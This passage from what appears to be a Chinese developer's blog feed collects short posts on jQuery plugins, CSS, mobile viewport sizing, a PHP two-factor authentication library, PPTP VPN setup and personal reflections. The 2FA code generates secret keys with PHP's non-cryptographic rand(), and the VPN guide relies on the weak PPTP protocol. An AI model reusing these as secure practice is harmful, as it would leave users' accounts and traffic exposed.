      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-rate/</url>
      
        <content type="html"><![CDATA[<pre><code class="javascript">/**     *  Simple rate 插件 *  V1.0 *  @author ln *  html :  &lt;input id=&quot;rating&quot; range-max=&quot;12&quot; value=&quot;10&quot;/&gt; *  $(&#39;#rating&#39;).rate(); */;(function($){    $.fn.rate = function(op){        var defaults = {            &#39;range_max&#39;:5,            &#39;bg_path&#39;:&#39;img/rate.png&#39;,  //未选中图片            &#39;bg_path_rating&#39;:&#39;img/rating.png&#39;, //选中的图片            &#39;star_width&#39;:36,            &#39;star_height&#39;:36,            &#39;call_back&#39;:function(){}        }            if(this.length &gt; 0){            return this.each(function(){                var opts = $.extend(defaults,op); //配置                var $rate = $(this);            //input                var $rate_bar;  //构建的评分条                if($(this).attr(&#39;range-max&#39;))                    opts.range_max = parseInt($(this).attr(&#39;range-max&#39;));                _build.call(this,opts);                $rate_bar = $(this).next()                _init_set.call(this);                //下面这段代码必须重构                $(this).next().children().bind(&#39;mouseover&#39;,function(){                    _pre_rate.call(this);                });                $(this).next().children().bind(&#39;mouseout&#39;,function(){                    var rate_value  = $rate.val();                    rate_value = rate_value&gt;0?rate_value:0;                    _set_style(rate_value);                });                $(this).next().children().bind(&#39;click&#39;,function(){                    _pre_rate.call(this);                    var index = $(this).parent().children().index($(this));                    _init_set.call(this,index+1);                    opts.call_back(index+1);                });                //初始化页面                function _build(opts){                    var ele_mark = &#39;&lt;ul style=&quot;list-style:none;&#39;+                                        &#39;display:block;&quot;&gt;&#39;;                    if(opts.range_max){                        for (var i = opts.range_max - 1; i &gt;= 0; i--) {                            ele_mark+=&#39;&lt;li         style=&quot;display:block;&#39;+                                                &#39;width:&#39;+opts.star_width+&#39;px;&#39;+                                                &#39;height:&#39;+opts.star_height+&#39;px;&#39;+                                                &#39;cursor:pointer;&#39;+                                                &#39;float:left;&quot;&#39;+                                        &#39;&gt;&lt;/li&gt;&#39;;                        };                    }                    ele_mark+=&quot;&lt;/ul&gt;&quot;;                    $(this).hide().after(ele_mark);                }                    function _init_set(rate_value){                    if(rate_value){                        $rate.val(rate_value);                    }else{                        rate_value = $rate.val();                    }                    _set_style(rate_value);                }                function _pre_rate(){                    var index = $rate_bar.children().index($(this));                    _set_style(index+1);                }                function _set_style(rate_value){                    $rate_bar.children().css(&#39;background&#39;,&#39;url(\&quot;&#39;+opts.bg_path+&#39;\&quot;) no-repeat #fff&#39;);                    $rate_bar.children().slice(0,rate_value).css(&#39;background&#39;,&#39;url(\&quot;&#39;+opts.bg_path_rating+&#39;\&quot;) no-repeat #fff&#39;);                }            });        }    }})(jQuery);</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>css 三角形</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/css-angel/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/css-angel/</url>
      
        <content type="html"><![CDATA[<p>html 元素</p><p><em class="arrow"></em></p><p>css 代码</p><pre><code class="css">{_margin-bottom: 0;height: 0;width: 0;font-size: 0;line-height: 0;border-width: 7px;border-style: solid;border-color: transparent transparent rgb(118, 214, 28) transparent;_filter: chroma(color=tomato);_border-color: tomato tomato #F6F6F9 tomato;position: relative;display: block;left: 20px;z-index: 2;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>根据中奖几率百分比抽奖算法</title>
      <link href="/php/php/random-by-percent/"/>
      <url>/php/php/random-by-percent/</url>
      
        <content type="html"><![CDATA[<pre><code class="php">if($media_app[&#39;MediaApp&#39;][&#39;ratio&#39;]){                    $max_rand_number = 1 / $media_app[&#39;MediaApp&#39;][&#39;ratio&#39;];                    $rand_value       = rand( 1, $max_rand_number );                    $is_become_winner = ( $rand_value == 1 );                }</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>触屏网站之网站尺寸</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/screen-size/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/screen-size/</url>
      
        <content type="html"><![CDATA[<p>本文分为两个部分，第一部分讨论跨平台网站的可行性，第二部分讨论viewport是如何设置的</p><p><strong>开发跨平台网站？</strong></p><p><strong>靠标签的自适应宽高实现多尺寸通用！？</strong></p><p>标签宽高可以自适应没错，我们很早就可以这么做了。但是你会发现很多pc端的传统网站还是会把宽度固定。（淘宝采用1000px宽度，搜狐950px…）为什么我们不让网站自适应宽高呢？那是因为，如果我们听任标签宽度被浏览器任意拉伸，将导致极差的体验：你不会希望当浏览器被缩放到100px时，你的左边栏变成了面条；也不会希望当浏览器被过度拉伸时，你的网站看起来像小学生的横格本。所以，靠标签的自适应来实现跨平台，是<strong>不现实</strong>的，是以牺牲用户体验为代价的。很多时候我们必须固定宽高。</p><p><strong>依靠html5设备检测构建响应式网站！</strong></p><p>我们依靠html5的设备检测查看当前设备是手机还是平板，并依此去加载相对应的css。举个例子来说：如果检测到你的设备是平板，我可以横着显示三栏，如果是手机的话，我就只显示一栏。这个听起来不难，但实现起来非常复杂，我们不仅要针对不同设备开发多套模版，还要对图片的尺寸进行处理。对此，我们可以看看波士顿环球报是如何借助HTML5实现响应式设计的。</p><p>总的来说，实现跨平台网站对大多数网站来说成本过高，限制太多，是否可行要结合网站实际情况。</p><p><strong>viewport与网站尺寸</strong></p><p>手机浏览器是把页面放在一个虚拟的“窗口”（viewport）中，通常这个虚拟的“窗口”（viewport）比屏幕宽，这样就不用把每个网页挤到很小 的窗口中（这样会破坏没有针对手机浏览器优化的网页的布局），用户可以通过平移和缩放来看网页的不同部分。移动浏览器引进了 viewport 这个 meta tag，让网页开发者来控制 viewport 的大小和缩放。</p><p><strong>基本概念</strong></p><p><strong>（1） CSS pixels与device pixels</strong></p><p>CSS pixels： 浏览器使用的抽象单位， 主要用来在网页上绘制内容。</p><p>device pixels： 显示屏幕的的最小物理单位，每个dp包含自己的颜色、亮度。</p><p>等值的 CSS pixels在手机屏幕上占多大的位置，这不是固定的，这取决于很多属性。经过分析和总结，我们可以得出这么一条公式： 1 CSS pixels = （devicePixelRatio）^2 device pixels （^2是平方的意思，至于 devicePixelRatio是什么东西，后面会讲解） 。</p><p><strong>（2） PPI/DPI</strong></p><p>PPI，有时也叫DPI，所表示的是每英寸所拥有的像素（pixel）数目，数值越高，即代表显示屏能够以越高的密度显示图像。（注：这里的像素， 指的是device pixels。）搞清楚了PPI是什么意思，我们就能很容易理解PPI的计算方式了，我们需要首先算出手机屏幕的对角线等效像素，然后处以对角线（我们平 常所说的手机屏幕尺寸就是说的手机屏幕对角线的长度），就可以得到PPI了。准确的计算公示大家可以参照下图。比较有意思的是，根据公式计算出来的 iPhone 4的PPI为330，要比苹果官方公布的326要高一点点。</p><p><img src="/前端工程/frontend/screen-size/201301071147367.jpg" alt="img"></p><p>同理，以HTC G7为例，480*800的分辨率，3.7英寸，算出来就是252的PPI。</p><p><strong>（3） 密度决定比例</strong></p><p>我们计算PPI就是为了知道一部手机设备是属于哪个密度区间的，因为不同的密度区间，对应着不同的默认缩放比例，这是一个很重要的概念。</p><p><img src="/前端工程/frontend/screen-size/201301071147368.jpg" alt="img"></p><p>由上图可知，PPI在120-160之间的手机被归为低密度手机，160-240被归为中密度，240-320被归为高密度，320以上被归为超高密度（Apple给了它一个上流的名字——retina）。</p><p>这些密度对应着一个特定的缩放比例值，拿我们最熟悉的iphone4或4s来说，它们的PPI是326，属于超高密度的手机。当我们书写一个宽度为 320px的页面放到iphone中显示，你会发现，它竟然是满宽的。这是因为，页面被默认放大了两倍，也就是640px，而iphone4或4s的宽， 正是640px。</p><p>图中把高密度的一类圈起来，是因为这是android手机的统计数据，在国内安卓手机市场中，高密度的设备占了绝大多数的市场份额，这是很重要的一点，也是我们做安卓端webapp要注意的关键点。</p><p><strong>viewport的使用</strong></p><p>viewport总共有5个属性，分别如下：</p><p>复制代码</p><p>代码如下:</p><meta name="viewport" content=" height = [ pixel_value |device-height] , width = [ pixel_value |device-width ] , initial-scale = float_value , minimum-scale = float_value , maximum-scale = float_value , user-scalable =[yes | no] , target- densitydpi = [ dpi_value | device-dpi| high-dpi | medium-dpi | low-dpi] "><p>在这些属性里面，我们重点关注<strong>target-densitydpi</strong>，这个属性可以改变设备的默认缩放。 medium-dpi是target-densitydpi的默认值，如果我们定义target-densitydpi=device-dpi，那么 设备就会按照真实的dpi来渲染页面。打个比方说，一张320<em>480的图片，放在iphone4里面，默认是占满屏幕的，但如果定义了target- densitydpi=device-dpi，那么图片只占屏幕的四分之一（二分之一的平方），因为iphone4的分辨率是640</em>960。</p><p><strong>解决方案</strong></p><p><strong>（1） 简单粗暴</strong></p><p>如果我们按照320px宽的设计稿去制作页面，并且不做任何的设置，页面会默认自动缩放到跟手机屏幕相等的宽度（这是由于 medium-dpi是target-densitydpi的默认值，和不同密度对应不同缩放比例所决定的，这一切都是移动设备自动完成的 ）。所以这种解决方案，简单，粗暴，有效。但有一个致命的缺点，对于高密度和超高密度的手机设备，页面（特别是图片）会失真，而且密度越多，失真越厉害。</p><p><strong>（2） 极致完美</strong></p><p>在这种方案中，我们采用 target-densitydpi=device-dpi，这样一来，手机设备就会按照真实的像素数目来渲染，用专业的话来说，就是1 CSS pixels = 1 device pixels。比如对于 640<em>960的 iphone，我们就可以做出 640</em>960的页面，在iphone上显示也不会有滚动条。当然，对于其他设备，也需制作不同尺寸的页面，所以这种方案往往是使用媒体查询来做成响应式 的页面。这种方案可以在特定的分辨率下完美呈现，但是随着要兼容的不同分辨率越多，成本就越高，因为需要为每一种分辨率书写单独的代码。下面举个简单的例 子：</p><p>复制代码</p><p>代码如下:</p><p>&lt;meta name=”viewport”content=”target- densitydpi =device-dpi, width=device-width “ /&gt; #header { background:url (medium-density-image.png); } @media screen and (- webkit -device-pixel-ratio:1.5) { /<em> CSS for high-density screens </em>/ #header { background:url (high-density-image.png);} } @media screen and (- webkit -device-pixel-ratio:0.75) { /<em> CSS for low-density screens </em>/ #header { background:url (low-density-image.png);}</p><p><img src="/前端工程/frontend/screen-size/2013010711473610.jpg" alt="img"></p><p><strong>（3） 合理折中</strong></p><p>针对安卓设备绝大多数是高密度，部分是中密度的特点，我们可以采用一个折中的方案：我们对480px宽的设计稿进行还原，但是页面制却做成 320px宽（使用background-size来对图片进行缩小），然后，让页面自动按照比例缩放。这样一来，低密度的手机有滚动条（这种手机基本上 已经没有人在用了），中密度的手机会浪费一点点流量，高密度的手机完美呈现，超高密度的手机轻微失真（超高密度的安卓手机很少）。这种方案的优点非常明 显：只需要一套设计稿，一套代码（这里只是讨论安卓手机的情况）。</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jQuery 插件图片延迟加载</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-image-lazy-load/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-image-lazy-load/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">(function() {    if ($(&#39;#id&#39;).length) {        var win = $(window);        var elements = $(&#39;#id&#39;).find(&#39;img&#39;);        var checkShow = function(event) {                var fold = win.height() + win.scrollTop();                elements.each(function() {                    if (fold &gt; $(this).offset().top) {                        $(this).trigger(&quot;appear&quot;);                        elements = elements.not(this);                    }                });                !elements.length &amp;&amp; win.unbind(&quot;scroll&quot;, checkShow);            };        elements.each(function() {            $(this).one(&quot;appear&quot;, function() {                $(this).attr(&quot;src&quot;, $(this).attr(&quot;longdesc&quot;));            });        });        win.bind(&quot;scroll&quot;, checkShow);        checkShow();    }})();</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>jQuery 图片翻转插件</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-image-rotate/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/jquery-plugin-image-rotate/</url>
      
        <content type="html"><![CDATA[<pre><code class="java">;(function($){    $.fn.dbRotate2D=function(options){        var opt={            rotateSpeed:100       //È¸Àü¼Óµµ        }        $.extend(opt,options);        return this.each(function(){            var $this=$(this);            var $img=$this.find(&#39;img&#39;);            var imgWidth=$img.width();            var imgHeight=$img.height();            var mOver=false;            init();            function init(){                setCss();                setMouseEvent();            }            function setCss(){                        $this.css({&#39;width&#39;:imgWidth,&#39;height&#39;:imgHeight});                $img.data({&#39;out&#39;:$img.attr(&#39;src&#39;),&#39;over&#39;:$img.attr(&#39;alt&#39;)});            }            function setMouseEvent(){                $this.bind(&#39;mouseenter&#39;,function(){                    mOver=true;                    setAnimation();                }).bind(&#39;mouseleave&#39;,function(){                    mOver=false;                    setAnimation();                })            }            function setAnimation(){                if(mOver==true){                    $img.stop()                        .animate({&#39;left&#39;:imgWidth/2,&#39;width&#39;:0},opt.rotateSpeed,function(){                            $(this).attr({&#39;src&#39;:$(this).data(&#39;over&#39;)});                        })                        .animate({&#39;left&#39;:0,&#39;width&#39;:imgWidth},opt.rotateSpeed)                }else{                    $img.stop()                        .animate({&#39;left&#39;:imgWidth/2,&#39;width&#39;:0},opt.rotateSpeed,function(){                                                    $(this).attr({&#39;src&#39;:$(this).data(&#39;out&#39;)});                        })                        .animate({&#39;left&#39;:0,&#39;width&#39;:imgWidth},opt.rotateSpeed)                }            }            })                }            })(jQuery)</code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>google 两步验证的一个库</title>
      <link href="/php/php/php-google-2-fa/"/>
      <url>/php/php/php-google-2-fa/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?/** * This program is free software: you can redistribute it and/or modify * it under the terms of the GNU General Public License as published by * the Free Software Foundation, either version 3 of the License, or * (at your option) any later version. * * This program is distributed in the hope that it will be useful, * but WITHOUT ANY WARRANTY; without even the implied warranty of * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the * GNU General Public License for more details. * * You should have received a copy of the GNU General Public License * along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;. * * PHP Google two-factor authentication module. * * See http://www.idontplaydarts.com/2011/07/google-totp-two-factor-authentication-for-php/ * for more details * * @author Phil **/class Google2FA {    const keyRegeneration   = 30;   // Interval between key regeneration    const otpLength     = 6;    // Length of the Token generated    private static $lut = array(    // Lookup needed for Base32 encoding        &quot;A&quot; =&gt; 0,   &quot;B&quot; =&gt; 1,        &quot;C&quot; =&gt; 2,   &quot;D&quot; =&gt; 3,        &quot;E&quot; =&gt; 4,   &quot;F&quot; =&gt; 5,        &quot;G&quot; =&gt; 6,   &quot;H&quot; =&gt; 7,        &quot;I&quot; =&gt; 8,   &quot;J&quot; =&gt; 9,        &quot;K&quot; =&gt; 10,  &quot;L&quot; =&gt; 11,        &quot;M&quot; =&gt; 12,  &quot;N&quot; =&gt; 13,        &quot;O&quot; =&gt; 14,  &quot;P&quot; =&gt; 15,        &quot;Q&quot; =&gt; 16,  &quot;R&quot; =&gt; 17,        &quot;S&quot; =&gt; 18,  &quot;T&quot; =&gt; 19,        &quot;U&quot; =&gt; 20,  &quot;V&quot; =&gt; 21,        &quot;W&quot; =&gt; 22,  &quot;X&quot; =&gt; 23,        &quot;Y&quot; =&gt; 24,  &quot;Z&quot; =&gt; 25,        &quot;2&quot; =&gt; 26,  &quot;3&quot; =&gt; 27,        &quot;4&quot; =&gt; 28,  &quot;5&quot; =&gt; 29,        &quot;6&quot; =&gt; 30,  &quot;7&quot; =&gt; 31    );    /**     * Generates a 16 digit secret key in base32 format     * @return string     **/    public static function generate_secret_key($length = 16) {        $b32    = &quot;234567QWERTYUIOPASDFGHJKLZXCVBNM&quot;;        $s  = &quot;&quot;;        for ($i = 0; $i &lt; $length; $i++)            $s .= $b32[rand(0,31)];        return $s;    }    /**     * Returns the current Unix Timestamp devided by the keyRegeneration     * period.     * @return integer     **/    public static function get_timestamp() {        return floor(microtime(true)/self::keyRegeneration);    }    /**     * Decodes a base32 string into a binary string.     **/    public static function base32_decode($b32) {        $b32    = strtoupper($b32);        if (!preg_match(&#39;/^[ABCDEFGHIJKLMNOPQRSTUVWXYZ234567]+$/&#39;, $b32, $match))            throw new Exception(&#39;Invalid characters in the base32 string.&#39;);        $l  = strlen($b32);        $n  = 0;        $j  = 0;        $binary = &quot;&quot;;        for ($i = 0; $i &lt; $l; $i++) {            $n = $n &lt;&lt; 5;               // Move buffer left by 5 to make room            $n = $n + self::$lut[$b32[$i]];     // Add value into buffer            $j = $j + 5;                // Keep track of number of bits in buffer            if ($j &gt;= 8) {                $j = $j - 8;                $binary .= chr(($n &amp; (0xFF &lt;&lt; $j)) &gt;&gt; $j);            }        }        return $binary;    }    /**     * Takes the secret key and the timestamp and returns the one time     * password.     *     * @param binary $key - Secret key in binary form.     * @param integer $counter - Timestamp as returned by get_timestamp.     * @return string     **/    public static function oath_hotp($key, $counter)    {        if (strlen($key) &lt; 8)        throw new Exception(&#39;Secret key is too short. Must be at least 16 base 32 characters&#39;);        $bin_counter = pack(&#39;N*&#39;, 0) . pack(&#39;N*&#39;, $counter);        // Counter must be 64-bit int        $hash    = hash_hmac (&#39;sha1&#39;, $bin_counter, $key, true);        return str_pad(self::oath_truncate($hash), self::otpLength, &#39;0&#39;, STR_PAD_LEFT);    }    /**     * Verifys a user inputted key against the current timestamp. Checks $window     * keys either side of the timestamp.     *     * @param string $b32seed     * @param string $key - User specified key     * @param integer $window     * @param boolean $useTimeStamp     * @return boolean     **/    public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {        $timeStamp = self::get_timestamp();        if ($useTimeStamp !== true) $timeStamp = (int)$useTimeStamp;        $binarySeed = self::base32_decode($b32seed);        for ($ts = $timeStamp - $window; $ts &lt;= $timeStamp + $window; $ts++)            if (self::oath_hotp($binarySeed, $ts) == $key)                return true;        return false;    }    /**     * Extracts the OTP from the SHA1 hash.     * @param binary $hash     * @return integer     **/    public static function oath_truncate($hash)    {        $offset = ord($hash[19]) &amp; 0xf;        return (            ((ord($hash[$offset+0]) &amp; 0x7f) &lt;&lt; 24 ) |            ((ord($hash[$offset+1]) &amp; 0xff) &lt;&lt; 16 ) |            ((ord($hash[$offset+2]) &amp; 0xff) &lt;&lt; 8 ) |            (ord($hash[$offset+3]) &amp; 0xff)        ) % pow(10, self::otpLength);    }}$InitalizationKey = &quot;PEHMPSDNLXIOG65U&quot;;                 // Set the inital key$TimeStamp    = Google2FA::get_timestamp();$secretkey    = Google2FA::base32_decode($InitalizationKey);    // Decode it into binary$otp          = Google2FA::oath_hotp($secretkey, $TimeStamp);   // Get current tokenecho(&quot;Init key: $InitalizationKey\n&quot;);echo(&quot;Timestamp: $TimeStamp\n&quot;);echo(&quot;One time password: $otp\n&quot;);// Use this to verify a key as it allows for some time drift.$result = Google2FA::verify_key($InitalizationKey, &quot;123456&quot;);var_dump($result);</code></pre>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>vps 下 搭建vpn</title>
      <link href="/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/vpn-server/"/>
      <url>/%E8%BF%90%E7%BB%B4%E5%BC%80%E5%8F%91/devops/vpn-server/</url>
      
        <content type="html"><![CDATA[<p><strong>1、用root账户登陆服务器</strong></p><p><strong>2、安装PPTPD</strong></p><pre><code>apt-get install pptpd</code></pre><p><strong>3、编辑pptpd.conf文件</strong></p><pre><code>vi /etc/pptpd.conf</code></pre><p>取消注释下面内容</p><pre><code>option /etc/ppp/pptpd-optionslocalip 192.168.0.1remoteip 192.168.0.234-238,192.168.0.245</code></pre><p>这几句的意思是：当外部计算机通过pptp联接到vpn后所能拿到的ip地址范围和服务器的ip地址设置。</p><p><strong>4、添加用于登陆的账户</strong></p><pre><code>vi /etc/ppp/chap-secrets</code></pre><p>格式如下：</p><pre><code>用户名 pptpd &quot;密码&quot; *</code></pre><p>密码需要用英文双引号<br>星号(*)代表允许接入的ip可以是任意ip。<br>这样，vpn就搭建好了，不过大多数人包括我在内，用国外服务器搭VPN都是为了偶尔能跳出局域网，所以我们还需要配置转发。</p><p><strong>5、设置DNS解析，编辑pptpd-options文件</strong></p><pre><code>vi /etc/ppp/pptpd-options</code></pre><p>找到ms-dns，取消掉注释，并修改DNS地址，这里我推荐大家用Google DNS 8.8.8.8 和 8.8.4.4</p><p><strong>6、开启转发</strong></p><pre><code>vi /etc/sysctl.conf</code></pre><p>取消注释以下内容</p><pre><code>net.ipv4.ip_forward=1</code></pre><p>这句话意思是：打开内核IP转发</p><p>这里需要生效 </p><blockquote><p> sudo sysctl -p</p></blockquote><p><strong>7、安装iptables并设置</strong></p><pre><code>apt-get install iptablesiptables -t nat -I POSTROUTING -j MASQUERADE</code></pre><p>后面这句话作用是：立刻让LINUX支持NAT(platinum)</p><p><strong>8、重新启动服务</strong></p><pre><code>/etc/init.d/pptpd restart</code></pre><p><strong>9、大功告成，你可以使用你的VPN在无疆的互联网中翱翔啦～</strong></p>]]></content>
      
      
      <categories>
          
          <category> 运维开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>和自己对话【日常个人感悟】</title>
      <link href="/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/talk-to-myself/"/>
      <url>/%E8%87%AA%E6%88%91%E7%AE%A1%E7%90%86/self-management/talk-to-myself/</url>
      
        <content type="html"><![CDATA[<h2 id="2020-04-12"><a href="#2020-04-12" class="headerlink" title="2020.04.12"></a>2020.04.12</h2><p>自己一直都是一个想法很多的人，但这么多年很多东西都只是想法而已，没有把一个想法做到底，这是一件很悲哀的事情。</p><p>注意力是一件很贵的东西，每天的信息大量摄入，做了这么多年开发，越是热爱计算机，越是做不好。因为注意力被严重分散了。多么希望自己有一个能拿出得出手的作品，“善始者实繁 克终者盖寡”，其实很多东西还达不到选择这个层面，把手上的东西做透已经够吃了。</p><p>侯先生经常说“凡走过必留下足迹”，所谓“走弯路”，未必不是一件好事。<br>排队的时候，你会发现一个规律——另一排总是动的比较快；你换到另一排，你原来站的那一排，就开始动的比较快了；你站的越久，越有可能是站错了排。这就是神奇的墨菲定理。所以，不让自己后悔的最好办法，就是坚持你的人生梦想而不去张望别人。<br>要么旅行，要么读书，身体和灵魂必须有一个在路上。</p><p>专注就是凝神，把每一件小事做好，活在当下就是修行。</p><h2 id="2020-5-3"><a href="#2020-5-3" class="headerlink" title="2020.5.3"></a>2020.5.3</h2><p>写作的逻辑不是仅仅是写作本身。</p><p>写作应该是一个循环，学习 -&gt; 造轮子 -&gt; 写作-&gt;发现问题</p><p>有很多吓人的头衔，但是还需要出来讨生活的人，往往都不靠谱。</p><p>想要买一款生产力工具，先把这个工具的钱赚到再买。</p><h2 id="2020-5-4"><a href="#2020-5-4" class="headerlink" title="2020.5.4"></a>2020.5.4</h2><p>成为了一个孤独的人，于是写作水平就上去了。</p><p>写作的本质是发现问题、解决问题、整理问题。这样内容和素材源源不断。</p><p>应用系统的演化方向是业务复杂度自己消化，技术复杂度转移到云厂商，然后通过购买服务的方式解决。</p><h2 id="2020-7-5"><a href="#2020-7-5" class="headerlink" title="2020.7.5"></a>2020.7.5</h2><p>以前的学习方式太快了，快到什么都没有留下来。</p><p>除了自考之外，很久都没有长时间规划一次学习了。</p><p>最好的学习方式是练习，但是找不到练习的地方怎么办，那就是写作，并发表出去让别人指出你的错误。</p><p>使用写作驱动学习。</p><h2 id="2020-07-22"><a href="#2020-07-22" class="headerlink" title="2020.07.22"></a>2020.07.22</h2><p>模型思维很重要，任何做事情的方法都可以抽象成模型，例如如何设计一个软件，如何分析一个需求，都是在为这件事建模。当我意识到这个概念后，发现已经有人写过一本书《模型思维》</p><p>我们做 DDD 相关的工作，本质上也是模型思维。</p><p>很多时候感觉行动力不够，想玩手机、想玩知乎，本质上都是身体状况不太好，身体没有能量持续输出。所以不能把自己搞得太累，该休息的时候就休息，该工作的时候认真工作。懂得取舍和寻找自己有价值的东西</p><p>看到了一个很好的养生的视频：</p><p><a href="https://v.qq.com/x/page/m0379udbutu.html" target="_blank" rel="noopener">https://v.qq.com/x/page/m0379udbutu.html</a></p><p>“道法自然”的含义是尊重规律，不要和规律对抗，我们凡人心浮气躁，往往看不到规律，因此也一直在门外了。</p><p><a href="https://haokan.baidu.com/v?vid=3812836309598569855&amp;pd=bjh&amp;fr=bjhauthor&amp;type=video" target="_blank" rel="noopener">https://haokan.baidu.com/v?vid=3812836309598569855&amp;pd=bjh&amp;fr=bjhauthor&amp;type=video</a></p>]]></content>
      
      
      <categories>
          
          <category> 自我管理 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>产品官网 Portal 页面参考</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/portal-page-collection/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/portal-page-collection/</url>
      
        <content type="html"><![CDATA[<h2 id="VPUSH"><a href="#VPUSH" class="headerlink" title="VPUSH"></a>VPUSH</h2><p><a href="https://vpush.pro/" target="_blank" rel="noopener">https://vpush.pro/</a></p><h2 id="Seata"><a href="#Seata" class="headerlink" title="Seata"></a>Seata</h2><p><a href="http://seata.io/en-us/index.html" target="_blank" rel="noopener">http://seata.io/en-us/index.html</a></p><p>阿里开源的 seata </p><p>DDD 项目可以参考这个站点 </p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>写作变现渠道</title>
      <link href="/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-earnings/"/>
      <url>/%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/writing/writing-earnings/</url>
      
        <content type="html"><![CDATA[<h2 id="付费小专栏"><a href="#付费小专栏" class="headerlink" title="付费小专栏"></a>付费小专栏</h2><ul><li><p>小专栏 <a href="https://xiaozhuanlan.com/" target="_blank" rel="noopener">https://xiaozhuanlan.com/</a></p></li><li><p>知乎一小时</p></li><li><p>掘金小册</p></li><li><p>一本册子：<a href="http://yibenezi.com" target="_blank" rel="noopener">http://yibenezi.com</a></p></li><li><p>看云 <a href="http://www.kancloud.cn" target="_blank" rel="noopener">www.kancloud.cn</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 写作技巧 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>建站系统 CMS 列表</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/cms-collections/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/cms-collections/</url>
      
        <content type="html"><![CDATA[<h2 id="x6cms-【推荐】"><a href="#x6cms-【推荐】" class="headerlink" title="x6cms 【推荐】"></a>x6cms 【推荐】</h2><p>专门做企业cms 而且限制没有太多</p><h2 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h2><p>简单的</p><p><a href="http://www.emlog.net/template/299" target="_blank" rel="noopener">http://www.emlog.net/template/299</a></p><h2 id="druper-joomal"><a href="#druper-joomal" class="headerlink" title="druper joomal"></a>druper joomal</h2><p>国外的，强大，操作不方便 </p><p>参考一个专业建站的文章 </p><p><a href="http://www.cmscase.com/choosecms.html" target="_blank" rel="noopener">http://www.cmscase.com/choosecms.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端工程 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>js创建对象的最佳实践</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/javascript-basic/"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B/frontend/javascript-basic/</url>
      
        <content type="html"><![CDATA[<h2 id="工厂方式"><a href="#工厂方式" class="headerlink" title="工厂方式"></a>工厂方式</h2><h3 id="原始的方式"><a href="#原始的方式" class="headerlink" title="原始的方式"></a>原始的方式</h3><p>因为对象的属性可以在对象创建后动态定义，所有许多开发者都在 JavaScript 最初引入时编写类似下面的代码：</p><pre><code>var oCar = new Object;oCar.color = &quot;blue&quot;;oCar.doors = 4;oCar.mpg = 25;oCar.showColor = function() {  alert(this.color);};</code></pre><p>在上面的代码中，创建对象 car。然后给它设置几个属性：它的颜色是蓝色，有四个门，每加仑油可以跑 25 英里。最后一个属性实际上是指向函数的指针，意味着该属性是个方法。执行这段代码后，就可以使用对象 car。</p><p>不过这里有一个问题，就是可能需要创建多个 car 的实例。</p><h3 id="解决方案：工厂方式"><a href="#解决方案：工厂方式" class="headerlink" title="解决方案：工厂方式"></a>解决方案：工厂方式</h3><p>要解决该问题，开发者创造了能创建并返回特定类型的对象的工厂函数（factory function）。</p><p>例如，函数 createCar() 可用于封装前面列出的创建 car 对象的操作：</p><pre><code>function createCar() {  var oTempCar = new Object;  oTempCar.color = &quot;blue&quot;;  oTempCar.doors = 4;  oTempCar.mpg = 25;  oTempCar.showColor = function() {    alert(this.color);  };  return oTempCar;}var oCar1 = createCar();var oCar2 = createCar();</code></pre><p>在这里，第一个例子中的所有代码都包含在 createCar() 函数中。此外，还有一行额外的代码，返回 car 